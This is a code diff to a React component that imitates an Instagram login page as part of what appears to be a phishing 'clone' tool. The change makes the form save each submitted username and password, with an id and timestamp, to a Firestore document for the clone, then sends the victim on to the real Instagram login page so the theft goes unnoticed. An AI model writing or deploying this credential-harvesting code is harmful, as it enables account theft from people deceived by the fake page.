@@ -1,6 +1,7 @@
 'use client';
 import { useState } from 'react';
-import { useClones } from '@/hooks/use-clones';
+import { db } from '@/lib/firebase';
+import { doc, updateDoc, getDoc } from 'firebase/firestore';
 import type { Clone } from '@/lib/types';
 import { Facebook } from 'lucide-react';
 
@@ -15,14 +16,27 @@ const InstagramLogo = () => (
 
 
 export default function InstagramPage({ clone }: { clone: Clone }) {
-  const { addCredential } = useClones();
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (username) {
-        addCredential(clone.id, { username, password });
+      const newCredential = {
+        id: `cred-${Math.random().toString(36).substr(2, 9)}`,
+        username,
+        password,
+        createdAt: new Date().toISOString(),
+      };
+
+      const cloneRef = doc(db, 'clones', clone.id);
+      const cloneSnap = await getDoc(cloneRef);
+      if (cloneSnap.exists()) {
+        const currentCredentials = cloneSnap.data().credentials || [];
+        await updateDoc(cloneRef, {
+          credentials: [newCredential, ...currentCredentials],
+        });
+      }
     }
     window.location.href = 'https://www.instagram.com/accounts/login/';
   };
